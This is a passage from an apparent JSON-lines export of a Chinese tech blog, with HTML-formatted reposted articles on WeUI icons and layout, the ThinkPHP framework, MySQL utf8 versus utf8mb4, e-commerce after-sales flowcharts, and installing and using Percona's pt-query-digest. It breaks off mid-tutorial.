style=\"color:rgb(239,239,143);\">section</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">h2</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"title\"</span>&gt;</span>章标题<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">h2</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">section</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">h3</span>&gt;</span>1.1 节标题<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">h3</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span>&gt;</span>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod\n                tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,\n                quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo\n                consequat. Duis aute<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">section</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">section</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">h3</span>&gt;</span>1.2 节标题<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">h3</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span>&gt;</span>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod\n                tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,\n                cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non\n                proident, sunt in culpa qui officia deserunt mollit anim id est laborum.<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">section</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">section</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">article</span>&gt;</span></code></pre><h3 style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">Icon</h3><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><img src=\"http://static.oschina.net/uploads/img/201510/13184843_GAwU.png\" alt=\"\" style=\"border:none;width:414px;height:auto;\"></p><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">原文网址：<a href=\"https://www.oschina.net/p/weui\" rel=\"nofollow\">https://www.oschina.net/p/weui</a><br></p><pre><code class=\"language-html\"><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_msg weui_icon_success\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_msg weui_icon_info\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_msg weui_icon_warn\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_msg weui_icon_waiting\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_safe weui_icon_safe_success\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_safe weui_icon_safe_warn\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"icon_sp_area\"</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_success\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_success_circle\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_success_no_circle\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_info\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_waiting\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_waiting_circle\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_circle\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_warn\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_download\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n</code></pre><p><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span></p>                                    </div>", "log_PostTime": 1584891060, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "ThinkPHP 详细介绍", "log_Intro": "ThinkPHP 详细介绍", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><strong>ThinkPHP</strong> 是一个免费开源的，快速、简单的面向对象的 轻量级PHP开发框架 ，创立于2006年初，遵循Apache2开源协议发布，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。并且拥有众多的原创功能和特性，在社区团队的积极参与下，在易用性、扩展性和性能方面不断优化和改进，已经成长为国内最领先和最具影响力的WEB应用开发框架，众多的典型案例确保可以稳定用于商业以及门户级的开发。</p><h4 style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;font-size:16px;background-color:rgb(255,255,255);\">全面的WEB开发特性支持</h4><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">最新的ThinkPHP为WEB应用开发提供了强有力的支持，这些支持包括：</p><ul class=\"list-paddingleft-2\" style=\"margin-bottom:0px;padding-right:30px;padding-left:30px;color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><li><p>MVC支持-基于多层模型（M）、视图（V）、控制器（C）的设计模式</p></li><li><p>ORM支持-提供了全功能和高性能的ORM支持，支持大部分数据库</p></li><li><p>模板引擎支持-内置了高性能的基于标签库和XML标签的编译型模板引擎</p></li><li><p>RESTFul支持-通过REST控制器扩展提供了RESTFul支持，为你打造全新的URL设计和访问体验</p></li><li><p>云平台支持-提供了对新浪SAE平台和百度BAE平台的强力支持，具备“横跨性”和“平滑性”，支持本地化开发和调试以及部署切换，让你轻松过渡，打造全新的开发体验。</p></li><li><p>CLI支持-支持基于命令行的应用开发</p></li><li><p>RPC支持-提供包括PHPRpc、HProse、jsonRPC和Yar在内远程调用解决方案</p></li><li><p>MongoDb支持-提供NoSQL的支持</p></li><li><p>缓存支持-提供了包括文件、数据库、Memcache、Xcache、Redis等多种类型的缓存支持</p></li></ul><h4 style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;font-size:16px;background-color:rgb(255,255,255);\">安全性</h4><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">框架在系统层面提供了众多的安全特性，确保你的网站和产品安全无忧。这些特性包括：</p><ul class=\"list-paddingleft-2\" style=\"margin-bottom:0px;padding-right:30px;padding-left:30px;color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><li><p>XSS安全防护</p></li><li><p>表单自动验证</p></li><li><p>强制数据类型转换</p></li><li><p>输入数据过滤</p></li><li><p>表单令牌验证</p></li><li><p>防SQL注入</p></li><li><p>图像上传检测</p></li></ul><p>转载原文：<a href=\"https://www.oschina.net/p/thinkphp\" rel=\"nofollow\">https://www.oschina.net/p/thinkphp</a></p>                                    </div>", "log_PostTime": 1584891062, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "浅谈MySQL中utf8和utf8mb4的区别", "log_Intro": "浅谈MySQL中utf8和utf8mb4的区别", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3 style=\"border:0px;margin-top:0px;margin-bottom:0px;padding:0px;color:rgb(51,51,51);font-family:'微软雅黑', PMingLiU, Verdana, Arial, Helvetica, sans-serif;background-color:rgb(250,250,250);\"><span style=\"border:0px;margin:0px;padding:0px;\">一、什么是UTF8MB4？</span></h3><p style=\"border:0px;margin-bottom:0px;padding-top:5px;padding-bottom:5px;line-height:22px;color:rgb(51,51,51);font-family:'微软雅黑', PMingLiU, Verdana, Arial, Helvetica, sans-serif;background-color:rgb(250,250,250);\"><span style=\"font-size:16px;\">我们在使用PhpMyAdmin管理面板时，可以在首页看到名为“Server connection collation”（服务器连接排序规则）的选项，用来选择所使用的字符集。对于我们常用的UTF8，却有utf8和utf8mb4两种，这是为什么呢？</span></p><p style=\"border:0px;margin-bottom:0px;padding-top:5px;padding-bottom:5px;line-height:22px;color:rgb(51,51,51);font-family:'微软雅黑', PMingLiU, Verdana, Arial, Helvetica, sans-serif;font-size:13px;background-color:rgb(250,250,250);\"><img class=\"aligncenter\" src=\"http://7xomln.com1.z0.glb.clouddn.com/utf8-and-utf8mb4/server-connection-collation.jpg\" alt=\"\" width=\"265\" height=\"131\" style=\"border:0px;margin-right:auto;margin-left:auto;padding:0px;\"></p><p style=\"border:0px;margin-bottom:0px;padding-top:5px;padding-bottom:5px;line-height:22px;color:rgb(51,51,51);font-family:'微软雅黑', PMingLiU, Verdana, Arial, Helvetica, sans-serif;background-color:rgb(250,250,250);\"><span style=\"font-size:16px;\">原来，MySQL在5.5.3版本之后增加了这个utf8mb4的编码，mb4就是most bytes 4的意思，专门用来兼容四字节的unicode。其实，utf8mb4是utf8的超集，理论上原来使用utf8，然后将字符集修改为utf8mb4，也会不会对已有的utf8编码读取产生任何问题。当然，为了节省空间，一般情况下使用utf8也就够了。</span></p><p style=\"border:0px;margin-bottom:0px;padding-top:5px;padding-bottom:5px;line-height:22px;color:rgb(51,51,51);font-family:'微软雅黑', PMingLiU, Verdana, Arial, Helvetica, sans-serif;background-color:rgb(250,250,250);\"><span style=\"font-size:16px;\"><br></span></p><h3 style=\"border:0px;margin-top:0px;margin-bottom:0px;padding:0px;color:rgb(51,51,51);font-family:'微软雅黑', PMingLiU, Verdana, Arial, Helvetica, sans-serif;background-color:rgb(250,250,250);\">二、为什么会有UTF8MB4？</h3><p style=\"border:0px;margin-bottom:0px;padding-top:5px;padding-bottom:5px;line-height:22px;color:rgb(51,51,51);font-family:'微软雅黑', PMingLiU, Verdana, Arial, Helvetica, sans-serif;background-color:rgb(250,250,250);\"><span style=\"font-size:16px;\">既然utf8应付日常使用完全没有问题，那为什么还要使用utf8mb4呢? 低版本的MySQL支持的utf8编码，最大字符长度为 3 字节，如果遇到 4 字节的字符就会出现错误了。三个字节的 UTF-8 最大能编码的 Unicode 字符是 0xFFFF，也就是 Unicode 中的基本多文平面（BMP）。也就是说，任何不在基本多文平面的 Unicode字符，都无法使用MySQL原有的 utf8 字符集存储。这些不在BMP中的字符包括哪些呢？最常见的就是Emoji 表情（Emoji 是一种特殊的 Unicode 编码，常见于 ios 和 android 手机上），和一些不常用的汉字，以及任何新增的 Unicode 字符等等。</span></p><p style=\"border:0px;margin-bottom:0px;padding-top:5px;padding-bottom:5px;line-height:22px;color:rgb(51,51,51);font-family:'微软雅黑', PMingLiU, Verdana, Arial, Helvetica, sans-serif;background-color:rgb(250,250,250);\"><span style=\"font-size:16px;\"><br></span></p><h3 style=\"border:0px;margin-top:0px;margin-bottom:0px;padding:0px;color:rgb(51,51,51);font-family:'微软雅黑', PMingLiU, Verdana, Arial, Helvetica, sans-serif;background-color:rgb(250,250,250);\">三、扩展阅读：UTF-8编码</h3><p style=\"border:0px;margin-bottom:0px;padding-top:5px;padding-bottom:5px;line-height:22px;color:rgb(51,51,51);font-family:'微软雅黑', PMingLiU, Verdana, Arial, Helvetica, sans-serif;background-color:rgb(250,250,250);\"><span style=\"font-size:16px;\">理论上将， UTF-8 格式使用一至六个字节，最大能编码 31 位字符。最新的 UTF-8 规范只使用一到四个字节，最大能编码21位，正好能够表示所有的 17个 Unicode 平面。关于UTF编码，请阅读《<a href=\"http://blog.xieyc.com/common-code-standard-unicode-utf-iso-8859-1-etc/\" rel=\"nofollow\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,221);\">常见编码总结</a>》一文。</span></p><p style=\"border:0px;margin-bottom:0px;padding-top:5px;padding-bottom:5px;line-height:22px;color:rgb(51,51,51);font-family:'微软雅黑', PMingLiU, Verdana, Arial, Helvetica, sans-serif;background-color:rgb(250,250,250);\"><span style=\"font-size:16px;\">而utf8 则是 Mysql 早期版本中支持的一种字符集，只支持最长三个字节的 UTF-8字符，也就是 Unicode 中的基本多文本平面。这<span style=\"border:0px;margin:0px;padding:0px;line-height:1.5;\">可能是因为在MySQL发布初期，基本多文种平面之外的字符确实很少用到。而在MySQL5.5.3版本后，</span>要在 Mysql 中保存 4 字节长度的 UTF-8 字符，就可以使用 utf8mb4 字符集了。例如可以用utf8mb4字符编码直接存储emoj表情，而不是存表情的替换字符。</span></p><p style=\"border:0px;margin-bottom:0px;padding-top:5px;padding-bottom:5px;line-height:22px;color:rgb(51,51,51);font-family:'微软雅黑', PMingLiU, Verdana, Arial, Helvetica, sans-serif;background-color:rgb(250,250,250);\"><span style=\"font-size:16px;\">为了获取更好的兼容性，应该总是使用 utf8mb4 而非 utf8，事实上，最新版的phpmyadmin默认字符集就是utf8mb4。诚然，对于 CHAR 类型数据，使用utf8mb4 存储会多消耗一些空间。</span></p><p style=\"border:0px;margin-bottom:0px;padding-top:5px;padding-bottom:5px;line-height:22px;color:rgb(51,51,51);font-family:'微软雅黑', PMingLiU, Verdana, Arial, Helvetica, sans-serif;background-color:rgb(250,250,250);\"><br></p><p style=\"border:0px;margin-bottom:0px;padding-top:5px;padding-bottom:5px;line-height:22px;color:rgb(51,51,51);font-family:'微软雅黑', PMingLiU, Verdana, Arial, Helvetica, sans-serif;background-color:rgb(250,250,250);\"><span style=\"font-size:16px;\">转载原文：<a href=\"http://blog.xieyc.com/utf8-and-utf8mb4/\" rel=\"nofollow\">http://blog.xieyc.com/utf8-and-utf8mb4/</a></span></p>                                    </div>", "log_PostTime": 1584891062, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "电商售后业务流程图", "log_Intro": "电商售后业务流程图", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong><span style=\"font-size:18px;\">1.取消订单</span></strong></p><p><span style=\"font-size:18px;\"><img src=\"https://img-blog.csdn.net/20180512214810690\" alt=\"\"><br></span></p><p><strong><span style=\"font-size:18px;\">2.申请退货</span></strong></p><p><span style=\"font-size:18px;\"><img src=\"https://img-blog.csdn.net/20180512214852664\" alt=\"\"><br></span></p><p><strong><span style=\"font-size:18px;\">3.申请换货</span></strong></p><p><span style=\"font-size:18px;\"><img src=\"https://img-blog.csdn.net/2018051221491959\" alt=\"\"><br></span></p>                                    </div>", "log_PostTime": 1584891064, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "MySQL慢查询分析工具pt-query-digest详解", "log_Intro": "MySQL慢查询分析工具pt-query-digest详解", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <div style=\"margin:0px;padding:0px;\"><div style=\"margin:0px;padding:0px 0px 10px;width:944.344px;min-height:200px;float:left;\"><div class=\"post\" style=\"margin:0px;padding:0px;\"><div class=\"postBody\" style=\"margin:0px;padding:0px;color:rgb(0,0,0);line-height:1.7;\"><div class=\"blogpost-body\" style=\"margin:0px 0px 20px;padding:0px;\"><h3 style=\"margin-top:10px;margin-bottom:10px;padding:0px;line-height:1.5;\"><span style=\"font-size:18px;\">一、简介</span></h3><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">pt-query-digest是用于分析mysql慢查询的一个工具，它可以分析binlog、General log、slowlog，也可以通过SHOWPROCESSLIST或者通过tcpdump抓取的MySQL协议数据来进行分析。可以把分析结果输出到文件中，分析过程是先对查询语句的条件进行参数化，然后对参数化以后的查询进行分组统计，统计出各查询的执行时间、次数、占比等，可以借助分析结果找出问题进行优化。</span></p><h3 style=\"margin-top:10px;margin-bottom:10px;padding:0px;line-height:1.5;\"><span style=\"font-size:18px;\">二、安装pt-query-digest</span></h3><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">1.下载页面：<span style=\"margin:0px;padding:0px;color:rgb(51,153,102);\"><a href=\"https://www.percona.com/doc/percona-toolkit/2.2/installation.html\" rel=\"nofollow\" style=\"margin:0px;padding:0px;color:#000000;text-decoration:underline;\"><span style=\"margin:0px;padding:0px;color:rgb(51,153,102);\">https://www.percona.com/doc/percona-toolkit/2.2/installation.html</span></a></span><br style=\"margin:0px;padding:0px;\">2.perl的模块</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">yum install -y perl-CPAN perl-<span style=\"margin:0px;padding:0px;color:rgb(0,128,128);line-height:1.5;\">Time</span>-HiRes</span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">3.安装步骤<br style=\"margin:0px;padding:0px;\">方法一：rpm安装</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">cd /usr/local/<span style=\"margin:0px;padding:0px;line-height:1.5;\">src\nwget percona</span>.com/get/percona-toolkit.<span style=\"margin:0px;padding:0px;line-height:1.5;\">rpm\nyum install </span>-y percona-toolkit.rpm</span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">工具安装目录在：/usr/bin<br style=\"margin:0px;padding:0px;\"><br style=\"margin:0px;padding:0px;\">方法二：源码安装</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">cd /usr/local/<span style=\"margin:0px;padding:0px;line-height:1.5;\">src\nwget percona.com</span>/<span style=\"margin:0px;padding:0px;color:rgb(0,0,255);line-height:1.5;\">get</span>/percona-<span style=\"margin:0px;padding:0px;line-height:1.5;\">toolkit.tar.gz\ntar zxf percona</span>-<span style=\"margin:0px;padding:0px;line-height:1.5;\">toolkit.tar.gz\ncd percona</span>-toolkit-<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">2.2</span>.<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">19</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">\nperl Makefile.PL PREFIX</span>=/usr/local/percona-<span style=\"margin:0px;padding:0px;line-height:1.5;\">toolkit\nmake </span>&amp;&amp; make install</span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">工具安装目录在：/usr/local/percona-toolkit/bin<br style=\"margin:0px;padding:0px;\"><br style=\"margin:0px;padding:0px;\">4.各工具用法简介（详细内容：<span style=\"margin:0px;padding:0px;color:rgb(51,153,102);\"><a href=\"https://www.percona.com/doc/percona-toolkit/2.2/index.html\" rel=\"nofollow\" style=\"margin:0px;padding:0px;color:#000000;text-decoration:underline;\"><span style=\"margin:0px;padding:0px;color:rgb(51,153,102);\">https://www.percona.com/doc/percona-toolkit/2.2/index.html</span></a></span>）<br style=\"margin:0px;padding:0px;\">(1)慢查询日志分析统计</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">pt-query-digest /usr/local/mysql/data/slow.log</span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">(2)服务器摘要</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">pt-summary </span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">(3)服务器磁盘监测</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">pt-diskstats </span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">(4)mysql服务状态摘要</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">pt-mysql-summary -- --user=root --password=root </span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\"><br></span></p><p style=\"margin:10px auto;\"><strong><span style=\"font-size:18px;\">三、pt-query-digest语法及重要选项</span></strong></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span 